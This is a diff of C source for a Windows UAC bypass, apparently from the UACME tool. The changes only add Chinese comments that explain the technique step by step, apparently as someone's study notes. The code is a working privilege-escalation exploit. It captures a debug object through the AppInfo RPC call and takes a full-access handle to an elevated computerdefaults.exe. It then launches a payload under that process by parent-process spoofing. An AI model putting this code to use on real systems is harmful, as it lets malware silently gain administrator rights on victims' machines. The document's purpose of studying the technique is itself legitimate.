@@ -32,7 +32,7 @@
 *
 * Purpose:
 *
-* Run target task as schtasks does.
+* Run target task as schtasks does.像schtasks那样运行目标任务。
 *
 */
 BOOLEAN ucmxStartTask()
@@ -357,7 +357,7 @@ NTSTATUS ucmTokenModUIAccessMethod(
 *
 * Purpose:
 *
-* Create new process using parent process handle.
+* Create new process using parent process handle. 创建新进程使用父进程句柄
 *
 */
 NTSTATUS ucmxCreateProcessFromParent(
@@ -421,7 +421,7 @@ NTSTATUS ucmxCreateProcessFromParent(
 *
 * Purpose:
 *
-* Bypass UAC by direct RPC call to APPINFO and DebugObject use.
+* Bypass UAC by direct RPC call to APPINFO and DebugObject use. 
 *
 */
 NTSTATUS ucmDebugObjectMethod(
@@ -445,18 +445,18 @@ NTSTATUS ucmDebugObjectMethod(
 
         //
         // Spawn initial non elevated victim process under debug.
-        //
+        // 
 
 
         //do { /* remove comment for attempt to spam debug object within thread pool */
 
         _strcpy(szProcess, g_ctx->szSystemDirectory);
         _strcat(szProcess, WINVER_EXE);
-
-        if (!AicLaunchAdminProcess(szProcess,
+        // AicLaunchAdminProcess 这个常用于UAC绕过，启动成功后返回1构造RPC请求，执行管理员的操作时会调用他？ 
+        if (!AicLaunchAdminProcess(szProcess, // 0x012fec5c L"C:\\Windows\\system32\\winver.exe"
             szProcess,
-            0,
-            CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS,
+            0,    // startflags设置为0
+            CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS, // debug_process创建标志设置 初始化服务器中 RPC 线程的 TEB 中的调试对象字段，并将其分配给新进程。
             g_ctx->szSystemRoot,
             T_DEFAULT_DESKTOP,
             NULL,
@@ -470,42 +470,42 @@ NTSTATUS ucmDebugObjectMethod(
 
 
         //
-        // Capture debug object handle.
+        // Capture debug object handle. 捕获debug对象句柄
         //
-
-        status = supGetProcessDebugObject(procInfo.hProcess,
+        // supGetProcessDebugObject 这个里边包含了对 NtQueryInformationProcess 函数的调用
+        status = supGetProcessDebugObject(procInfo.hProcess, // 使用NtQueryInformationProcess和返回的进程句柄打开调试对象的句柄。
             &dbgHandle);
 
-        if (!NT_SUCCESS(status)) {
-            TerminateProcess(procInfo.hProcess, 0);
+        if (!NT_SUCCESS(status)) {  // 创建句柄如果不成功
+            TerminateProcess(procInfo.hProcess, 0);  
             CloseHandle(procInfo.hThread);
             CloseHandle(procInfo.hProcess);
             break;
         }
 
         //
-        // Detach debug and kill non elevated victim process.
+        // Detach debug and kill non elevated victim process. 分离、调试和杀死未提升的受害进程（分离调试器并终止不再需要的新进程）
         //
-        NtRemoveProcessDebug(procInfo.hProcess, dbgHandle);
-        TerminateProcess(procInfo.hProcess, 0);
+        NtRemoveProcessDebug(procInfo.hProcess, dbgHandle); // 分离调试器
+        TerminateProcess(procInfo.hProcess, 0);             // 终止进程
         CloseHandle(procInfo.hThread);
         CloseHandle(procInfo.hProcess);
 
         //} while (++retryCount < 20);
 
         //
-        // Spawn elevated victim under debug.
+        // Spawn elevated victim under debug.  在调试状态下生成提升的受害者
         //
         _strcpy(szProcess, g_ctx->szSystemDirectory);
-        _strcat(szProcess, COMPUTERDEFAULTS_EXE);
+        _strcat(szProcess, COMPUTERDEFAULTS_EXE); // 0x008fe9fc L"C:\\Windows\\system32\\computerdefaults.exe"
         RtlSecureZeroMemory(&procInfo, sizeof(procInfo));
         RtlSecureZeroMemory(&dbgEvent, sizeof(dbgEvent));
-
-        if (!AicLaunchAdminProcess(szProcess,
+         
+        if (!AicLaunchAdminProcess(szProcess,  // 创建一个新进程
             szProcess,
-            1,
-            CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS,
-            g_ctx->szSystemRoot,
+            1,                                 // startflag设置为1 
+            CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS, // DEBUG_PROCESS创建标志设置 
+            g_ctx->szSystemRoot,  // 由于TEB中的调试对象字段已经初始化了，所以将把NtQueryInformationProcess捕获的现有对象分配给新进程
             T_DEFAULT_DESKTOP,
             NULL,
             INFINITE,
@@ -517,23 +517,23 @@ NTSTATUS ucmDebugObjectMethod(
         }
 
         //
-        // Update thread TEB with debug object handle to receive debug events.
-        //
-        DbgUiSetThreadDebugObject(dbgHandle);
+        // Update thread TEB with debug object handle to receive debug events. 用调试对象句柄更新线程TEB以接收调试事件
+        // 检索将返回完整访问进程句柄的初始调试事件？
+        DbgUiSetThreadDebugObject(dbgHandle);  /* Just set the handle in the TEB 设置TEB句柄*/ 
         dbgProcessHandle = NULL;
 
         //
-        // Debugger wait cycle.
+        // Debugger wait cycle. 调试器等待周期 因为一次不一定能成 所以需要做个循环
         //
         while (1) {
 
-            if (!WaitForDebugEvent(&dbgEvent, INFINITE))
+            if (!WaitForDebugEvent(&dbgEvent, INFINITE))  // 等待正在调试的进程中发生调试事件。
                 break;
 
             switch (dbgEvent.dwDebugEventCode) {
 
                 //
-                // Capture initial debug event process handle.
+                // Capture initial debug event process handle. 捕获初始调试事件处理句柄
                 //
             case CREATE_PROCESS_DEBUG_EVENT:
                 dbgProcessHandle = dbgEvent.u.CreateProcessInfo.hProcess;
@@ -542,8 +542,8 @@ NTSTATUS ucmDebugObjectMethod(
 
             if (dbgProcessHandle)
                 break;
-
-            ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
+            // 使调试器能够继续 先前报告调试事件的线程 逐个？
+            ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE); 
 
         }
 
@@ -551,7 +551,7 @@ NTSTATUS ucmDebugObjectMethod(
             break;
 
         //
-        // Create new handle from captured with PROCESS_ALL_ACCESS.
+        // Create new handle from captured with PROCESS_ALL_ACCESS.  使用PROCESS_ALL_ACCESS创建新的句柄。
         //
         dupHandle = NULL;
         status = NtDuplicateObject(dbgProcessHandle,
@@ -564,15 +564,15 @@ NTSTATUS ucmDebugObjectMethod(
 
         if (NT_SUCCESS(status)) {
             //
-            // Run new process with parent set to duplicated process handle.
+            // Run new process with parent set to duplicated process handle. 运行新的进程，父进程设置为重复的进程句柄。
             //
-            ucmxCreateProcessFromParent(dupHandle, lpszPayload);
+            ucmxCreateProcessFromParent(dupHandle, lpszPayload); // 在这里运行起来 创建新进程使用父进程句柄,涉及父进程欺骗
             NtClose(dupHandle);
         }
 
 #pragma warning(push)
 #pragma warning(disable: 6387)
-        DbgUiSetThreadDebugObject(NULL);
+        DbgUiSetThreadDebugObject(NULL); /* Just set the handle in the TEB 设置TEB句柄*/ 
 #pragma warning(pop)
 
         NtClose(dbgHandle);
@@ -581,7 +581,7 @@ NTSTATUS ucmDebugObjectMethod(
         CloseHandle(dbgProcessHandle);
 
         //
-        // Release victim process.
+        // Release victim process. 释放受害者的过程。
         //
         CloseHandle(procInfo.hThread);
         TerminateProcess(procInfo.hProcess, 0);
